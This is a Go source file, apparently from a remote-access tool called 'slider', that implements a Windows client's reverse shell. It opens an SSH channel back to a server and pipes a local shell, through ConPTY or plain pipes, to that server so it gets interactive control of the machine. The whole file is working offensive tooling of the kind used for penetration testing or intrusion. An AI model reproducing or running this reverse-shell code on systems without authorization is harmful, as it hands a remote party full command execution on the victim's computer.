//go:build windows

package client

import (
	"context"
	"encoding/json"
	"github.com/UserExistsError/conpty"
	"io"
	"os/exec"
	"slider/pkg/interpreter"

	"golang.org/x/crypto/ssh"
)

func (s *Session) sendReverseShell(request *ssh.Request) {
	channel, _, openErr := s.sshConn.OpenChannel("session", nil)
	if openErr != nil {
		s.Logger.Errorf("failed to open a \"session\" channel to server")
		return
	}
	defer func() { _ = channel.Close() }()

	cmd := exec.Command(s.interpreter.Shell, s.interpreter.ShellArgs...) //nolint:gosec

	if s.interpreter.PtyOn {
		// Request Server Terminal Size
		_, payload, reqErr := s.sendConnRequest("window-size", true, nil)
		if reqErr != nil {
			s.Logger.Errorf("%v", reqErr)
		}
		var termSize interpreter.TermSize
		if unMarshalErr := json.Unmarshal(payload, &termSize); unMarshalErr != nil {
			// If error term initializes with size 0 0
			s.Logger.Errorf("--%v", unMarshalErr)
		}

		// Notify server we will be sending a PTY
		_, errSSHReq := channel.SendRequest("pty-req", true, nil)
		if errSSHReq != nil {
			s.Logger.Errorf("pty-req %v", errSSHReq)
		}

		conPty, _ := conpty.Start(s.interpreter.Shell, conpty.ConPtyDimensions(termSize.Cols, termSize.Rows))
		s.setConPty(conPty)
		defer func() { _ = s.interpreter.Pty.Close() }()

		// Notify server we will send a Reverse Shell
		_, errSSHReq = channel.SendRequest("reverse-shell", true, nil)
		if errSSHReq != nil {
			s.Logger.Errorf("pty-req %v", errSSHReq)
		}

		go func() { _, _ = io.Copy(s.interpreter.Pty, channel) }()
		go func() { _, _ = io.Copy(channel, s.interpreter.Pty) }()

		// Reply Server we are good to go
		_ = s.replyConnRequest(request, true, []byte("shell-ready"))

		if code, err := s.interpreter.Pty.Wait(context.Background()); err != nil {
			s.Logger.Errorf("failed to spawn conpty with exit code %d", code)
		}
	} else {
		// - You are here cause the System is likely Windows < 2018 and does not support ConPTY
		// - Command Prompt Buffer Size can be set running: `mode con:cols=X lines=Y`,
		//   unfortunately there's no equivalent variable to set that up,
		//   so size won't be set or updated

		pr, pw := io.Pipe()

		cmd.Stdin = channel
		cmd.Stdout = pw
		cmd.Stderr = pw
		go func() { _, _ = io.Copy(channel, pr) }()

		// Reply Server we are good to go
		_ = s.replyConnRequest(request, true, []byte("shell-ready"))

		if runErr := cmd.Run(); runErr != nil {
			s.Logger.Errorf("%v", runErr)
		}
	}
}

func (s *Session) setConPty(conPty *conpty.ConPty) {
	s.sessionMutex.Lock()
	defer s.sessionMutex.Unlock()
	s.interpreter.Pty = conPty
}
